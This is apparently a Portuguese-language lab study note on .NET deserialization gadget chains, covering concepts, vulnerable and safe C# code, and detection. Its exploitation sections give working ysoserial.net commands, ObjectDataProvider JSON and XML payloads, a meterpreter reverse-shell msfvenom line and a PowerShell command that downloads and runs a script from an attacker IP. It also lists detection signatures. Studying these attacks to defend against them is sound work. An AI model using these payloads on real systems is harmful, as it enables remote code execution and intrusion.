---
title: "Deserialization — Advanced"
---

# Gadget Chains e Desserializacao Avancada (.NET/C#)

# O que é?

Desserialização avançada vai além da exploração direta de um único método vulnerável. O conceito
central e o de **gadget chains** — sequências de classes legítimas que, quando encadeadas durante
o processo de desserialização, resultam em execução de código arbitrário sem que nenhuma das classes
individuais seja intrinsecamente maliciosa.

O conceito e análogo ao **Return-Oriented Programming (ROP)** em exploits de memória: assim como
ROP encadeia fragmentos de código legítimo (gadgets) já presentes no binário para executar comandos
arbitrários sem injetar shellcode, gadget chains em desserialização encadeiam classes já carregadas
no classpath da aplicação para atingir RCE.

Esse paradigma recebe o nome de **Property Oriented Programming (POP)**: o atacante nao injeta
codigo, ele injeta propriedades — valores em campos de objetos já existentes — que dirigem o fluxo
de execução do runtime para um resultado malicioso.

**Como uma gadget chain funciona, conceitualmente:**

```
Input malicioso (objeto serializado)
           |
           v
   Desserializador instancia Classe A
           |
           | Classe A tem __wakeup() / toString() / Destrutor
           v
   Metodo de Classe A chama metodo em Classe B
           |
           | Classe B tem metodo que recebe dados de Classe A
           v
   Metodo de Classe B executa operacao com dados controlados pelo atacante
           |
           | Operacao e: Runtime.exec() / Process.Start() / shell_exec()
           v
        RCE
```

Nenhuma dessas classes foi escrita com intenção maliciosa. A exploração vem do encadeamento.

**Ferramentas que automatizam gadget chains:**

- **ysoserial** (Java): repositório de gadget chains para bibliotecas Java comuns como Apache
  Commons Collections, Spring, Groovy, JRE puro. Gera payloads prontos para uso.

- **ysoserial.net** (.NET/C#): equivalente para o ecossistema .NET. Suporta múltiplos
  serializadores: BinaryFormatter, Json.NET, XmlSerializer, ViewState, LosFormatter.

- **PHPGGC** (PHP): repositório de gadget chains para frameworks PHP (Laravel, Symfony, Yii,
  WordPress). Funciona como o ysoserial do PHP.

A existência dessas ferramentas significa que o atacante nao precisa descobrir a chain manualmente —
ele apenas identifica qual serializador e quais bibliotecas estao presentes, escolhe a gadget chain
correspondente, e gera o payload.

**Por que gadget chains existem:**
Linguagens orientadas a objetos carregam centenas de classes no classpath que nunca foram projetadas
com segurança em mente para o contexto de desserialização. Uma classe como `ObjectDataProvider`
existe para binding de dados em UIs. Uma classe como `Process` existe para gerenciar processos do
SO. Quando o desserializador pode instanciar qualquer classe do classpath e o atacante controla as
propriedades, a combinação dessas classes inocentes resulta em execução arbitrária.

# Onde é implementado?

Gadget chains em desserialização avançada afetam principalmente ambientes enterprise com frameworks
ricos em classpath:

**Java Enterprise:**

- **ViewState serializado em JSF (JavaServer Faces):** o estado da UI e serializado via
  ObjectInputStream. Se a chave HMAC for fraca ou ausente, ViewState pode ser forjado.

- **Spring Framework:** endpoints que aceitam objetos Java serializados via HTTP (Content-Type:
  application/x-java-serialized-object). JMX beans expostos remotamente tambem sao vetores.

- **RMI (Remote Method Invocation):** o protocolo RMI usa ObjectInputStream para transmitir
  objetos. Endpoints RMI expostos sem autenticacao sao classicamente vulneraveis.

- **Apache Commons Collections (ACC):** biblioteca utilitaria Java presente em praticamente todo
  projeto enterprise. Versoes anteriores a 3.2.2 e 4.1 contem gadgets que permitem RCE via
  InvokerTransformer. A presença de ACC no classpath e o primeiro sinal de alerta.

**Ecossistema .NET:**

- **ASP.NET ViewState legado:** o campo hidden `__VIEWSTATE` e serializado com LosFormatter ou
  ObjectStateFormatter (ambos baseados em BinaryFormatter internamente). Se MAC estiver desabilitado
  ou a machineKey for conhecida, o ViewState pode ser forjado com gadgets maliciosos.

- **SOAP e WCF (Windows Communication Foundation):** endpoints SOAP que aceitam tipos polimorficos
  via xsi:type podem ser explorados se o tipo for determinado pelo input do usuario.

- **BinaryFormatter em aplicacoes desktop e Remoting:** aplicacoes .NET Framework que usam
  BinaryFormatter para persistencia local ou comunicacao via .NET Remoting sao classicamente
  vulneraveis. O BinaryFormatter foi oficialmente marcado como obsoleto no .NET 5+ exatamente por
  nao ter mecanismo seguro de restricao de tipos.

- **Json.NET com TypeNameHandling.All em cookies de autenticacao:** aplicacoes ASP.NET que armazenam
  usuario autenticado como JSON com TypeNameHandling habilitado — um padrao detectado em diversas
  aplicacoes reais — permitem que o atacante substitua o cookie por um payload com `$type`
  apontando para ObjectDataProvider.

**Ruby on Rails:**

- Versoes antigas do Rails (antes de 5.2) usavam Marshal para serializar cookies cifrados. Com a
  chave secreta comprometida (secret_key_base), o cookie podia ser forjado com objetos Marshal
  maliciosos. CVEs documentados incluem Rails Cookie Deserialization RCE (2013).

**Node.js:**

- O pacote `node-serialize` (NPM) teve vulnerabilidade documentada onde funcoes JavaScript
  serializadas com IIFE (Immediately Invoked Function Expression) eram executadas durante
  desserialização. Qualquer aplicacao usando node-serialize com input do usuario e vulneravel.

# Como funciona de forma adequada?

Em uso legitimo, serializacao avancada permite que aplicacoes transmitam objetos complexos entre
processos, persista estado de UI, e transportem dados estruturados entre servicos.

**Como Java ObjectOutputStream/ObjectInputStream funciona corretamente:**

```
Servidor A                                   Servidor B
+------------------+                         +------------------+
|  UserSession obj |                         |  UserSession obj |
|  - userId: 42    |  ObjectOutputStream     |  - userId: 42    |
|  - role: "admin" |  ------------------>    |  - role: "admin" |
|  - expiry: ...   |   (stream de bytes)     |  - expiry: ...   |
+------------------+                         +------------------+
                                             ObjectInputStream.readObject()
                                             instancia UserSession
                                             chama readObject() se definido

USO CORRETO: dados internos entre dois servidores confiaveis,
nunca exposto a input do usuario.
```

**Diagrama de gadget chain — como ObjectDataProvider e explorado no .NET:**

```
JSON malicioso no cookie TTREMEMBER:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": { "$type": "System.Diagnostics.Process, System" }
}

           |
           v (Json.NET com TypeNameHandling.All desserializa)
           |
   +------------------------+
   | ObjectDataProvider     |   <- classe WPF legitima, usada para UI binding
   | MethodName="Start"     |
   +----------+-------------+
              |
              | chama .Start() no ObjectInstance
              v
   +------------------------+
   | Process                |   <- classe System legitima, gerencia processos
   | StartInfo=cmd.exe ...  |
   +----------+-------------+
              |
              | executa cmd.exe /c calc.exe
              v
        EXECUCAO ARBITRARIA
```

Nenhuma das duas classes e maliciosa individualmente. O perigo esta no encadeamento via
desserialização com TypeNameHandling.

**Como HMAC/assinatura de dados serializados protege contra tampering:**

```
GERACAO (lado servidor):
+------------------+    serialize()   +---------------------+
|  objeto legitimo |  ------------->  |  bytes serializados |
+------------------+                  +---------------------+
                                              |
                                    HMAC-SHA256(bytes, secret_key)
                                              |
                                              v
                                  cookie = base64(bytes) + "." + base64(hmac)

VERIFICACAO (mesmo servidor ao receber):
cookie recebido
    |
    v
separar bytes e hmac
    |
    +-- recalcular HMAC(bytes, secret_key)
    |
    +-- comparar com HMAC recebido (hmac.compare_digest para timing-safe)
    |
    +-- se diferente: rejeitar, logar, encerrar
    |
    +-- se igual: desserializar (dados nao foram alterados)
```

**Por que HMAC nao e suficiente sozinho quando o formato e nativo:**

HMAC garante integridade — o dado nao foi alterado em transito. Mas se o atacante tiver acesso a
chave (via LFI, codigo-fonte exposto, brute-force de chave fraca), ele pode forjar HMAC valido
para qualquer payload malicioso. A defesa real e nao usar formatos nativos com dados externos,
independente de HMAC.

**Como bibliotecas como Jackson no modo polimórfico sao perigosas:**

```java
// SEGURO por padrao — tipo fixo
ObjectMapper mapper = new ObjectMapper();
UserModel user = mapper.readValue(json, UserModel.class);
// Jackson so instancia UserModel, nada mais.

// PERIGOSO — modo polimórfico com enableDefaultTyping
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
// Agora o JSON pode conter "@class": "com.qualquer.Classe"
// e Jackson instanciara essa classe durante desserializacao.
// Atacante envia @class apontando para classe com efeito colateral no construtor.
```

A recomendacao oficial do Jackson desde 2019 e nunca usar enableDefaultTyping() com dados externos.
O equivalente seguro e usar @JsonTypeInfo com lista branca explicita de subtipos permitidos.

**Implementacao correta com restricao de tipos em .NET:**

```csharp
// Implementar SerializationBinder para restringir tipos aceitos
public class SafeSerializationBinder : SerializationBinder {
    // Lista branca de tipos permitidos — APENAS os que a aplicacao usa
    private static readonly Dictionary<string, Type> AllowedTypes =
        new Dictionary<string, Type> {
            { "MyApp.Models.UserSession", typeof(UserSession) },
            { "MyApp.Models.ShoppingCart", typeof(ShoppingCart) }
        };

    public override Type BindToType(string assemblyName, string typeName) {
        if (AllowedTypes.TryGetValue(typeName, out Type allowedType)) {
            return allowedType;
        }
        // Qualquer tipo fora da lista branca e rejeitado
        throw new SerializationException(
            $"Tipo nao autorizado para desserializacao: {typeName}"
        );
    }

    public override void BindToName(Type serializedType,
        out string assemblyName, out string typeName) {
        assemblyName = null;
        typeName = serializedType.FullName;
    }
}

// Uso com BinaryFormatter (mesmo assim, prefira DataContractSerializer)
var formatter = new BinaryFormatter {
    Binder = new SafeSerializationBinder()
};
var obj = formatter.Deserialize(stream);
```

---

## A Falha: A Superficie de Ataque e Todo o Classpath, Nao Uma Funcao Especifica

Em linguagens como .NET, Java e PHP, desserializacao insegura nao e uma vulnerabilidade localizada em um parametro ou endpoint. A superficie de ataque e todo o conjunto de classes carregadas em memoria pela aplicacao, o classpath completo.

A suposicao de design errada: o desenvolvedor acredita que, ao nao expor diretamente codigo perigoso, o endpoint de desserializacao e seguro. Mas o que ele esquece e que frameworks carregam automaticamente centenas de classes no classpath, como `PresentationFramework.dll`, `System.dll`, `mscorlib.dll`, que existem por razoes legitimas e que o desenvolvedor nao pode remover sem quebrar a aplicacao.

**Perspectiva do desenvolvedor vs. da runtime:**

O desenvolvedor pensa: "estou deserializando um objeto `User` simples, com `username` e `role`". A runtime pensa: "recebi um JSON com `$type: System.Windows.Data.ObjectDataProvider`, que e uma classe legitima do WPF. Vou instancia-la e chamar o metodo que ela pede".

**O que e uma gadget chain:** e uma sequencia de classes legitimas, ja carregadas no classpath, encadeadas de forma que a desserializacao de um objeto de entrada acione uma cadeia de chamadas que termina em execucao de codigo arbitrario. Nenhuma das classes individuais e "maliciosa" — elas existem para propositos legitimos. O que e malicioso e a forma como o atacante as encadeia.

**Por que o desenvolvedor nao pode simplesmente remover as classes perigosas:** `ObjectDataProvider` existe no WPF para binding de dados em interfaces graficas. `Process` existe no `System` para gerenciar processos do sistema operacional. `XmlSerializer` existe para serializacao XML. Remove-las quebraria funcionalidades centrais do framework.

**A solucao real nao e defender as classes, e nao desserializar input nao confiavel.** Ferramentas como `ysoserial.net` automatizam a geracao dessas cadeias para multiplos serializadores .NET: `BinaryFormatter`, `Json.NET` com `TypeNameHandling.All`, `XmlSerializer` com tipo controlado pelo usuario, `ViewState` sem MAC.

O impacto e sempre RCE quando gadget chains adequadas existem no classpath da aplicacao. Vulnerabilidades classicas documentadas:
- Telerik RadGrid e DotNetNuke (CVE via ViewState)
- Exchange Server (desserializacao em servicos internos)
- ASP.NET ViewState poisoning (padrao AAEAAAD em base64)
- Json.NET com TypeNameHandling.All em cookies de autenticacao

O ambiente alvo tipico: aplicacoes ASP.NET Framework (nao Core) rodando em IIS com .NET 4.x. Decompilacao com dotPeek ou ILSpy revela os serializadores usados e as classes disponiveis para gadget chains.

---

## Causa Raiz

A vulnerabilidade existe em tres configuracoes distintas, cada uma com causa raiz diferente:

### 1. Json.NET com TypeNameHandling

```csharp
// VULNERAVEL — aceita qualquer tipo do classpath via campo $type
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // ou Objects
};
var obj = JsonConvert.DeserializeObject(json, settings);
// Atacante envia: {"$type":"System.Windows.Data.ObjectDataProvider,...","MethodName":"Start",...}
// Runtime instancia ObjectDataProvider e chama Start() — executa Process

// SEGURO — TypeNameHandling.None
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None
};

// SE POLIMORFISMO FOR NECESSARIO — usar SerializationBinder com allowlist
public class SafeSerializationBinder : DefaultSerializationBinder {
    private static readonly HashSet<string> AllowedTypes = new HashSet<string> {
        "MyApp.Models.User",
        "MyApp.Models.Order"
    };

    public override Type BindToType(string assemblyName, string typeName) {
        if (!AllowedTypes.Contains(typeName))
            throw new InvalidOperationException($"Tipo nao permitido: {typeName}");
        return base.BindToType(assemblyName, typeName);
    }
}
```

### 2. XmlSerializer com Tipo Controlado pelo Usuario

```csharp
// VULNERAVEL — tipo determinado por input do usuario
Type type = Type.GetType(Request["type"]);
XmlSerializer xs = new XmlSerializer(type);
var obj = xs.Deserialize(xmlReader);
// Atacante passa type=System.Windows.Data.ObjectDataProvider,PresentationFramework

// SEGURO — tipo fixo em codigo, nunca derivado de input
XmlSerializer xs = new XmlSerializer(typeof(MyModel));
var obj = (MyModel)xs.Deserialize(xmlReader);
```

### 3. BinaryFormatter (sempre inseguro com input externo)

```csharp
// VULNERAVEL — BinaryFormatter nao tem mecanismo de restricao efetivo
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream);  // stream vem do usuario

// SEGURO — nao usar BinaryFormatter para input externo
// Usar DataContractSerializer (sem gadgets nativos) ou System.Text.Json
var dcs = new DataContractSerializer(typeof(MyModel));
var obj = (MyModel)dcs.ReadObject(xmlReader);

// System.Text.Json — seguro por padrao, sem TypeNameHandling
var obj = System.Text.Json.JsonSerializer.Deserialize<MyModel>(json);
```

### 4. ViewState sem Protecao de Integridade

```xml
<!-- VULNERAVEL — MAC desabilitado ou chave machineKey exposta -->
<system.web>
  <pages enableViewStateMac="false" />  <!-- nunca fazer isso -->
</system.web>

<!-- SEGURO — MAC habilitado com chave gerenciada automaticamente -->
<system.web>
  <pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
  <machineKey
    validationKey="AUTO,IsolateApps"
    decryptionKey="AUTO,IsolateApps"
    validation="HMACSHA256" />
</system.web>
```

---

## Serializadores .NET, ViewState e Gadget Chains com ObjectDataProvider

### Ecossistema de Serializadores .NET

| Serializador | Namespace | Risco |
|---|---|---|
| BinaryFormatter | System.Runtime.Serialization.Formatters.Binary | CRITICO — suporta gadget chains |
| SoapFormatter | System.Runtime.Serialization.Formatters.Soap | CRITICO |
| NetDataContractSerializer | System.Runtime.Serialization | CRITICO |
| ObjectStateFormatter | System.Web.UI | CRITICO — usado em ViewState |
| LosFormatter | System.Web.UI | CRITICO |
| JavaScriptSerializer | System.Web.Script.Serialization | Alto |
| Json.NET | Newtonsoft.Json | Alto (depende config) |
| XmlSerializer | System.Xml.Serialization | Medio (depende do tipo) |
| DataContractSerializer | System.Runtime.Serialization | Baixo (sem gadgets nativos) |
| YamlDotNet | YamlDotNet | Alto (versoes antigas) |

### ViewState (.NET)

ViewState e um mecanismo ASP.NET que preserva o estado de controles UI entre requests. Armazenado como campo hidden `__VIEWSTATE` ou cookie.

Magic bytes em base64: `AAEAAAD` (BinaryFormatter)
Magic bytes em hex: `00 01 00 00 00 FF FF FF FF`

O ViewState e serializado com `LosFormatter` ou `ObjectStateFormatter`. Se o MAC (Message Authentication Code) estiver desabilitado ou a chave `machineKey` for conhecida, e possivel injetar um ViewState malicioso.

### ObjectDataProvider Gadget

`ObjectDataProvider` e uma classe WPF (`PresentationFramework.dll`) que permite chamar metodos de qualquer objeto. E o gadget mais universal em deserializacao .NET.

Estrutura do payload JSON:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  },
  "MethodName": "Start"
}
```

Alternativa com `ObjectType` + `MethodParameters`:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "ObjectType": {
    "$type": "System.Type, mscorlib",
    "TypeHandle": {}
  },
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["C:\\Windows\\System32\\cmd.exe", "/c calc.exe"]
  },
  "MethodName": "Start"
}
```

### TypeConfuseDelegate Gadget

`TypeConfuseDelegate` e uma gadget chain que funciona com `BinaryFormatter`. Usa `ComparisonComparer` + `SortedSet` para triggerar execucao de codigo via delegate.

Esta cadeia e utilizada quando:
- O endpoint usa BinaryFormatter
- O payload precisa ser em formato binario (nao JSON)

### Json.NET — TypeNameHandling

Json.NET (Newtonsoft.Json) e vulneravel quando `TypeNameHandling` esta configurado para `All` ou `Objects`. Nesse caso, o deserializador aceita o campo `$type` no JSON e instancia qualquer classe disponivel no classpath.

Configuracao vulneravel:

```csharp
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
};
var obj = JsonConvert.DeserializeObject(json, settings);
```

Configuracao segura:

```csharp
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None
};
```

### XmlSerializer

`XmlSerializer` e vulneravel quando o tipo sendo deserializado e controlado pelo usuario. A vulnerabilidade ocorre porque XmlSerializer pode deserializar qualquer tipo passado como parametro.

Codigo vulneravel:

```csharp
Type type = Type.GetType(userSuppliedTypeName);
XmlSerializer xs = new XmlSerializer(type);
var obj = xs.Deserialize(xmlReader);
```

Codigo seguro — tipo fixo no codigo:

```csharp
XmlSerializer xs = new XmlSerializer(typeof(SafeClass));
var obj = xs.Deserialize(xmlReader);
```

---

## Identificacao

### Ferramentas de Decompilacao

Para analisar aplicacoes .NET compiladas:

**dotPeek (JetBrains — gratuito):**

```
1. Abrir o .exe ou .dll da aplicacao
2. Navegar para View -> Decompiled Sources
3. Procurar por referencias a serializadores:
   - BinaryFormatter
   - JsonConvert.DeserializeObject
   - XmlSerializer
   - new JavaScriptSerializer()
```

**ILSpy (open-source):**

```bash
# Linux via mono
mono ilspy.exe Application.dll

# Buscar por texto no codigo decompilado
grep -r "BinaryFormatter\|TypeNameHandling\|unserialize" decompiled/
```

**dnSpy — debugging em runtime:**

```
1. Abrir o executavel
2. Colocar breakpoint na funcao de deserializacao
3. Executar e inspecionar o objeto recebido
```

### Identificando ViewState Vulneravel

**1. Verificar campo `__VIEWSTATE` na pagina:**

```bash
curl -s http://target.htb/ | grep -i "viewstate"
```

**2. Verificar se MAC esta habilitado:**

Se `__VIEWSTATEGENERATOR` nao estiver presente, MAC pode estar desabilitado.

**3. Tentar ViewState sem assinatura:**

Modificar o ViewState na requisicao. Se a aplicacao aceitar sem erro, MAC esta desabilitado.

**4. Procurar chave `machineKey` em config:**

```bash
find / -name "web.config" 2>/dev/null | xargs grep -l "machineKey"
```

Se a chave for encontrada, e possivel gerar ViewState valido.

### Identificando Json.NET com TypeNameHandling

**1. Inspecionar cookies de autenticacao:**

Decodificar base64 do cookie — se contiver `$type`, Json.NET com TypeNameHandling esta em uso.

```bash
echo "COOKIE_VALUE" | base64 -d | python3 -m json.tool
```

**2. Verificar campo `$type` em requests:**

```
Cookie: TTREMEMBER=eyIkdHlwZSI6...
```

Decodificado:

```json
{"$type":"TeeTrove.Models.User, TeeTrove","username":"htb-stdnt","role":"user"}
```

Se a aplicacao aceitar e processar o campo `$type`, TypeNameHandling.All esta configurado.

**3. Testar injecao de tipo:**

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start"}
```

Se a aplicacao nao retornar erro de tipo invalido, o deserializador aceita tipos externos.

### Identificando XmlSerializer Vulneravel

**1. Verificar requests que contem XML:**

Procurar endpoints que recebem XML no corpo da requisicao ou em parametros.

**2. Verificar se o tipo e refletido na resposta:**

Se a resposta contem o nome do tipo, o tipo pode ser controlado.

**3. Procurar parametro `type` ou `class` em requests XML:**

```
POST /api/data HTTP/1.1
Content-Type: application/xml

<Data type="TeeTrove.Models.User">...</Data>
```

---

## Exploitation

### ysoserial.net — Geracao de Payloads

`ysoserial.net` e a ferramenta principal para geracao de gadget chains em .NET. Equivalente ao ysoserial para Java.

```bash
# Instalar (Windows ou via Wine no Linux)
# Download: https://github.com/pwntester/ysoserial.net

# Ver formatters e gadgets disponiveis
ysoserial.exe -h

# Gerar payload para BinaryFormatter com TypeConfuseDelegate
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c calc.exe"

# Gerar payload para Json.NET
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c calc.exe"

# Gerar payload para ViewState (sem MAC)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc.exe"

# Gerar payload para ViewState com machineKey conhecida
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc.exe" --decryptionalg="AES" --decryptionkey="CHAVE" --validationalg="SHA1" --validationkey="CHAVE"

# Gerar payload para XmlSerializer
ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "cmd /c calc.exe"

# Gerar base64 diretamente
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c calc.exe" -o base64
```

### Json.NET — TypeNameHandling.All (Cenario TeeTrove)

**Contexto:** Cookie `TTREMEMBER` contem usuario serializado com TypeNameHandling.All.

**Passo 1 — Decodificar o cookie atual:**

```bash
echo "eyIkdHlwZSI6IlRlZVRyb3ZlLk1vZGVscy5Vc2VyLCBUZWVUcm92ZSIsInVzZXJuYW1lIjoiaHRiLXN0ZG50Iiwicm9sZSI6InVzZXIifQ==" | base64 -d
```

Output:

```json
{"$type":"TeeTrove.Models.User, TeeTrove","username":"htb-stdnt","role":"user"}
```

**Passo 2 — Verificar assemblies disponiveis:**

Usando dotPeek, verificar quais DLLs estao referenciadas pelo projeto. PresentationFramework.dll (necessaria para ObjectDataProvider) deve estar presente.

**Passo 3 — Gerar payload com ysoserial.net:**

```bash
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c ping -n 5 10.10.14.5" -o base64
```

**Passo 4 — Adaptar o payload para o contexto:**

O payload gerado precisa ser formatado para caber no campo `$type` do cookie. Exemplo de payload adaptado:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd.exe", "/c ping -n 5 10.10.14.5"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

**Passo 5 — Encondificar em base64 e enviar:**

```bash
echo -n '{"$type":"..."}' | base64 -w 0
```

Substituir o cookie `TTREMEMBER` pelo payload base64.

**Passo 6 — Shell reversa:**

```bash
# Gerar payload de shell reversa
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c powershell -e BASE64_ENCODED_CMD" -o base64
```

### XmlSerializer com Tipo Controlado (Cenario TeeTrove)

**Contexto:** Endpoint `/api/account` aceita XML e o atributo `type` do elemento raiz determina o tipo a deserializar.

**Passo 1 — Verificar endpoint:**

```
POST /api/account HTTP/1.1
Host: teetrove.htb
Content-Type: application/xml

<Account type="TeeTrove.Models.User">
  <Username>test</Username>
</Account>
```

**Passo 2 — Verificar se tipo externo e aceito:**

```
POST /api/account HTTP/1.1
Host: teetrove.htb
Content-Type: application/xml

<Account type="System.Windows.Data.ObjectDataProvider, PresentationFramework">
  <MethodName>Start</MethodName>
</Account>
```

**Passo 3 — Gerar payload XmlSerializer:**

```bash
ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "cmd /c ping -n 5 10.10.14.5"
```

Output (XML):

```xml
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services">
  <ExpandedWrapperOfXamlReaderObjectDataProvider>
    <ProjectedProperty0>
      <ObjectInstance>
        <ObjectDataProvider>
          <MethodParameters xmlns:b="http://www.w3.org/2001/XMLSchema-instance" xmlns:c="http://www.w3.org/2001/XMLSchema">
            <anyType b:type="c:string">cmd.exe</anyType>
            <anyType b:type="c:string">/c ping -n 5 10.10.14.5</anyType>
          </MethodParameters>
          <MethodName>Start</MethodName>
        </ObjectDataProvider>
      </ObjectInstance>
    </ProjectedProperty0>
  </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

### BinaryFormatter — TTAUTH Cookie (Cenario TeeTrove)

**Contexto:** Cookie `TTAUTH` contem dados serializados com BinaryFormatter. Identificado pelos magic bytes `AAEAAAD` em base64.

**Passo 1 — Verificar magic bytes:**

```bash
echo "COOKIE_VALUE" | base64 -d | xxd | head -2
# 00 01 00 00 00 ff ff ff ff = BinaryFormatter
```

**Passo 2 — Gerar payload com TypeConfuseDelegate:**

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c ping -n 5 10.10.14.5" -o base64
```

**Passo 3 — Substituir cookie e confirmar execucao:**

```
Cookie: TTAUTH=AAEAAAD/////AQAAAAAAAAAMAgAAAF...
```

**Passo 4 — Shell reversa:**

```bash
# Gerar payload de shell reversa com meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Upload via PowerShell
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')" -o base64
```

### ViewState Deserialization

**Passo 1 — Extrair ViewState da pagina:**

```bash
curl -s http://target.htb/ | grep -oP '(?<=__VIEWSTATE" value=")[^"]*'
```

**Passo 2 — Verificar se MAC esta desabilitado:**

Tentar submeter um ViewState modificado. Se retornar erro `MAC validation failed`, MAC esta habilitado.

**Passo 3a — ViewState sem MAC:**

```bash
# Gerar payload ViewState sem assinatura
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c ping -n 5 10.10.14.5"
```

Substituir o campo `__VIEWSTATE` pelo payload gerado.

**Passo 3b — ViewState com machineKey conhecida:**

```bash
# Se a machineKey foi encontrada em web.config
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c ping -n 5 10.10.14.5" \
  --decryptionalg="AES" \
  --decryptionkey="4C4A4C4A4C4A..." \
  --validationalg="SHA1" \
  --validationkey="EC36...BE"
```

---

## Ferramentas

### ysoserial.net

```bash
# Instalacao (requer .NET Framework ou Wine)
wget https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1.34.zip
unzip ysoserial-1.34.zip

# Via Wine no Linux
wine ysoserial.exe -h

# Formatters disponiveis
wine ysoserial.exe -l

# Gadgets disponiveis
wine ysoserial.exe -g

# Gerar payload para formato especifico
wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "ping 10.10.14.5" -o base64
wine ysoserial.exe -f Json.Net -g ObjectDataProvider -c "ping 10.10.14.5" -o base64
wine ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "ping 10.10.14.5"
wine ysoserial.exe -f JavaScriptSerializer -g ObjectDataProvider -c "ping 10.10.14.5"
wine ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "ping 10.10.14.5" -o base64
```

### dotPeek / ILSpy

```
# dotPeek (Windows/Wine)
1. File -> Open -> selecionar .exe ou .dll
2. Navigator: buscar por classes com interfaces Serializable
3. Ctrl+F para buscar texto no codigo decompilado
4. Exportar projeto para C# legivel

# ILSpy CLI (mono)
mono ilspycmd.exe -p -o /output/ Application.dll
grep -r "BinaryFormatter\|TypeNameHandling\|XmlSerializer" /output/
```

### dnSpy

```
# Debugger para .NET
1. Abrir o executavel no dnSpy
2. Debug -> Start Debugging
3. Colocar breakpoints em:
   - BinaryFormatter.Deserialize()
   - JsonConvert.DeserializeObject()
   - XmlSerializer.Deserialize()
4. Inspecionar parametros durante execucao
```

### Burp Suite para .NET

```
# Extensoes uteis:
# - Hackvertor: encoding/decoding de payloads
# - JSON Beautifier: formatar JSON para leitura
# - .NET Beautifier: decodificar ViewState automaticamente

# Decodificar ViewState manualmente:
echo "VIEWSTATE_VALUE" | base64 -d | xxd | head
```

### Ferramentas de Analise

```bash
# Verificar magic bytes de diferentes serializadores
python3 -c "
import base64, sys

data = base64.b64decode(sys.argv[1])
hex_bytes = data[:8].hex()
print('Hex:', hex_bytes)

if data[:4] == b'\x00\x01\x00\x00':
    print('BinaryFormatter detected')
elif data[:3] == b'\x80\x04\x95':
    print('Python pickle protocol 4')
elif data[:2] == b'\x80\x02':
    print('Python pickle protocol 2')
"
```

---

## Detecção e Mitigação

### Indicadores em Requests

**BinaryFormatter:**
- Campo ou cookie com valor base64 comeando com `AAEAAAD`
- Bytes `00 01 00 00 00 FF FF FF FF` no inicio do valor decodificado
- `__VIEWSTATE` com conteudo nao padrao

**Json.NET com TypeNameHandling:**
- JSON com campo `$type` contendo nome de assembly completo
- Formato: `"$type":"Namespace.Class, Assembly, Version=..."`

**XmlSerializer:**
- XML com atributo `type` ou `xsi:type` contendo nome de classe
- Elemento raiz com tipo completo de assembly .NET

```bash
# Detectar em logs IIS
Select-String -Path "C:\inetpub\logs\LogFiles\*.log" -Pattern "\$type|AAEAAAD|TypeConfuse"

# Detectar payloads de ysoserial nos logs
grep -i "ObjectDataProvider\|TypeConfuseDelegate\|WindowsIdentity" /var/log/iis/
```

### Assinaturas de Ataque

```
# Json.NET TypeNameHandling payload
\$type.*PresentationFramework
\$type.*System\.Windows\.Data\.ObjectDataProvider
\$type.*System\.Diagnostics\.Process

# BinaryFormatter magic bytes (base64)
